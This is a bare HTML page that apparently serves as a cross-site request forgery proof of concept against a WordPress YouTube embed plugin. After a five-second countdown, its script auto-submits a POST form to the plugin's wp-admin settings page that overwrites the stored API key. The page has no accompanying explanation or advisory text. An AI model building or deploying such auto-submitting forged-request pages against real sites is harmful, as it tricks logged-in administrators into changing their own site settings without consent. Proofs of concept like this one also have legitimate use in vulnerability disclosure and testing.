<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Auto-Submit Form with Countdown</title>
  <style>
    /* Style the countdown display */
    #countdown {
      font-size: 1.2em;
      font-weight: bold;
      margin-bottom: 10px;
    }
  </style>
</head>
<body>

  <!-- Countdown display -->
  <div id="countdown">Submitting in 5 seconds...</div>

  <!-- Your form -->
  <form id="autoForm" method="POST" action="http://localhost/wp-admin/admin.php?page=youtube-my-preferences">
    <input type="text" name="ytprefs_submitted" value="Y">
    <input type="text" name="apikey" value="HELLO">
    <input type="submit" value="Submit Now">
  </form>

  <script>
    (function() {
      var seconds = 5;
      var countdownElem = document.getElementById('countdown');
      var form = document.getElementById('autoForm');

      var interval = setInterval(function() {
        seconds--;
        countdownElem.textContent = 'Submitting in ' + seconds + ' second' + (seconds !== 1 ? 's' : '') + '...';

        if (seconds <= 0) {
          clearInterval(interval);
          form.submit();
        }
      }, 1000);
    })();
  </script>

</body>
</html>
